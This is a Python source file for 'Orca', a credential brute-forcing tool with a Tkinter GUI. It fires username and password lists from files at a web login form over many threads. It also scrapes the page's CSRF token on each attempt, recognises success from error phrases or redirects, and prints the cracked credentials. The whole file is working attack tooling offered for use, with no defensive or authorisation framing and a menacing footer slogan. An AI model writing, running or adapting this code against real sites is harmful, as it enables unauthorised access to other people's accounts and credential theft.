import requests
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import tkinter as tk
from tkinter import filedialog, messagebox
from urllib.parse import urlparse
from bs4 import BeautifulSoup

class Orca:
    def __init__(self, url, usernames, passwords, user_field='username', pass_field='password',
                 threads=50, success_check=None, proxy=None, delay=0, verbosity=1, log_file=None,
                 error_phrases=None, sensitive_error_check=False, redirect_check=False):
        self.url = url
        self.usernames = usernames
        self.passwords = passwords
        self.user_field = user_field
        self.pass_field = pass_field
        self.threads = threads
        self.success_check = success_check if success_check else self.default_success_check
        self.proxy = proxy
        self.delay = delay
        self.verbosity = verbosity
        self.log_file = log_file
        self.error_phrases = error_phrases if error_phrases else []
        self.sensitive_error_check = sensitive_error_check
        self.redirect_check = redirect_check
        self.session = requests.Session()
        if self.proxy:
            self.session.proxies.update(self.proxy)
        self.start_time = time.time()
        self.attempts = 0
        self.success = False
        self.success_details = None

    def get_token(self):
        response = self.session.get(self.url)
        soup = BeautifulSoup(response.text, 'html.parser')
        token = soup.find('input', {'name': 'csrf_token'})
        if token:
            return token['value']
        return None

    def default_success_check(self, response):
        if self.sensitive_error_check:
            for phrase in self.error_phrases:
                if any(word in response.text for word in phrase.split()):
                    return False
        else:
            for phrase in self.error_phrases:
                if phrase in response.text:
                    return False

        if self.redirect_check:
            return response.url != self.url
        return True

    def brute_force(self):
        tasks = []

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for username in self.usernames:
                for password in self.passwords:
                    tasks.append(executor.submit(self.worker, username.strip(), password.strip()))

            for future in as_completed(tasks):
                result = future.result()
                if result:
                    self.success = True
                    self.success_details = result
                    break

        elapsed_time = time.time() - self.start_time
        self.attempts = len(self.usernames) * len(self.passwords)
        attempts_per_minute = self.attempts / elapsed_time * 60

        print(f"Total attempts: {self.attempts}")
        print(f"Elapsed time: {elapsed_time:.2f} seconds")
        print(f"Attempts per minute: {attempts_per_minute:.2f}")

        if self.success:
            print(f"Success! Username: {self.success_details['username']}, Password: {self.success_details['password']}")
        else:
            print("No valid username and password combination found.")

    def worker(self, username, password):
        if self.verbosity > 0:
            print(f"Trying {username}:{password}")

        token = self.get_token()
        response = self.login(username, password, token)

        if self.success_check(response):
            return {"username": username, "password": password}

        time.sleep(self.delay)
        return None

    def login(self, username, password, token=None):
        payload = {
            self.user_field: username,
            self.pass_field: password
        }
        if token:
            payload['csrf_token'] = token
        response = self.session.post(self.url, data=payload)
        return response

class OrcaGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("⚠ Orca By Mohamed Nabil")
        self.geometry("600x600")
        self.configure(bg="lightblue")
        self.create_widgets()

    def create_widgets(self):
        self.canvas = tk.Canvas(self, width=600, height=100, bg="lightblue", highlightthickness=0)
        self.canvas.pack()
        self.text = self.canvas.create_text(300, 50, text="⚠ Orca By Mohamed Nabil", font=("Helvetica", 24, "bold"), fill="blue")

        frame = tk.Frame(self, bg="lightblue")
        frame.pack(pady=10)

        self.url_label = tk.Label(frame, text="URL:", bg="lightblue", font=("Helvetica", 12, "bold"))
        self.url_label.grid(row=0, column=0, sticky=tk.W)
        self.url_entry = tk.Entry(frame, width=50)
        self.url_entry.grid(row=0, column=1)

        self.usernames_label = tk.Label(frame, text="Usernames (file or single):", bg="lightblue", font=("Helvetica", 12, "bold"))
        self.usernames_label.grid(row=1, column=0, sticky=tk.W)
        self.usernames_entry = tk.Entry(frame, width=50)
        self.usernames_entry.grid(row=1, column=1)
        self.usernames_button = tk.Button(frame, text="Browse", command=self.browse_usernames)
        self.usernames_button.grid(row=1, column=2)

        self.passwords_label = tk.Label(frame, text="Passwords (file or single):", bg="lightblue", font=("Helvetica", 12, "bold"))
        self.passwords_label.grid(row=2, column=0, sticky=tk.W)
        self.passwords_entry = tk.Entry(frame, width=50)
        self.passwords_entry.grid(row=2, column=1)
        self.passwords_button = tk.Button(frame, text="Browse", command=self.browse_passwords)
        self.passwords_button.grid(row=2, column=2)

        self.error_phrases_label = tk.Label(frame, text="Error Phrases (file or single, optional):", bg="lightblue", font=("Helvetica", 12, "bold"))
        self.error_phrases_label.grid(row=3, column=0, sticky=tk.W)
        self.error_phrases_entry = tk.Entry(frame, width=50)
        self.error_phrases_entry.grid(row=3, column=1)
        self.error_phrases_button = tk.Button(frame, text="Browse", command=self.browse_error_phrases)
        self.error_phrases_button.grid(row=3, column=2)

        self.threads_label = tk.Label(frame, text="Threads:", bg="lightblue", font=("Helvetica", 12, "bold"))
        self.threads_label.grid(row=4, column=0, sticky=tk.W)
        self.threads_entry = tk.Entry(frame, width=10)
        self.threads_entry.grid(row=4, column=1, sticky=tk.W)

        self.delay_label = tk.Label(frame, text="Delay (seconds):", bg="lightblue", font=("Helvetica", 12, "bold"))
        self.delay_label.grid(row=5, column=0, sticky=tk.W)
        self.delay_entry = tk.Entry(frame, width=10)
        self.delay_entry.grid(row=5, column=1, sticky=tk.W)

        self.sensitive_error_check_var = tk.IntVar()
        self.sensitive_error_check_check = tk.Checkbutton(frame, text="Sensitive Error Check", variable=self.sensitive_error_check_var, bg="lightblue", font=("Helvetica", 12, "bold"))
        self.sensitive_error_check_check.grid(row=6, columnspan=2, sticky=tk.W)

        self.redirect_check_var = tk.IntVar()
        self.redirect_check_check = tk.Checkbutton(frame, text="Check for Redirect on Success", variable=self.redirect_check_var, bg="lightblue", font=("Helvetica", 12, "bold"))
        self.redirect_check_check.grid(row=7, columnspan=2, sticky=tk.W)

        self.start_button = tk.Button(self, text="Start", command=self.start_brute_force, bg="blue", fg="white", font=("Helvetica", 12, "bold"))
        self.start_button.pack(pady=10)

        self.status_label = tk.Label(self, text="Status: Waiting", bg="lightblue", font=("Helvetica", 12, "bold"))
        self.status_label.pack(pady=5)

        self.footer_label = tk.Label(self, text="You should Fear The Phoenix , It Is Very Dangerous When He Gets Angry",
                                     bg="lightblue", fg="red", font=("Courier", 14, "bold"))
        self.footer_label.pack(side=tk.BOTTOM, pady=5)

    def browse_usernames(self):
        filename = filedialog.askopenfilename()
        self.usernames_entry.insert(0, filename)

    def browse_passwords(self):
        filename = filedialog.askopenfilename()
        self.passwords_entry.insert(0, filename)

    def browse_error_phrases(self):
        filename = filedialog.askopenfilename()
        self.error_phrases_entry.insert(0, filename)

    def start_brute_force(self):
        url = self.url_entry.get()
        usernames = self.usernames_entry.get()
        passwords = self.passwords_entry.get()
        error_phrases = self.error_phrases_entry.get()
        threads = int(self.threads_entry.get() or 50)
        delay = float(self.delay_entry.get() or 0)

        def load_list(filepath_or_value):
            if filepath_or_value and not filepath_or_value.strip().isdigit():
                with open(filepath_or_value, 'r') as file:
                    return [line.strip() for line in file]
            return [filepath_or_value]

        usernames_list = load_list(usernames)
        passwords_list = load_list(passwords)
        error_phrases_list = load_list(error_phrases)

        orca = Orca(
            url,
            usernames_list,
            passwords_list,
            threads=threads,
            delay=delay,
            error_phrases=error_phrases_list,
            sensitive_error_check=bool(self.sensitive_error_check_var.get()),
            redirect_check=bool(self.redirect_check_var.get())
        )

        self.status_label.config(text="Status: Running")
        orca.brute_force()
        self.status_label.config(text="Status: Completed")

if __name__ == "__main__":
    app = OrcaGUI()
    app.mainloop()
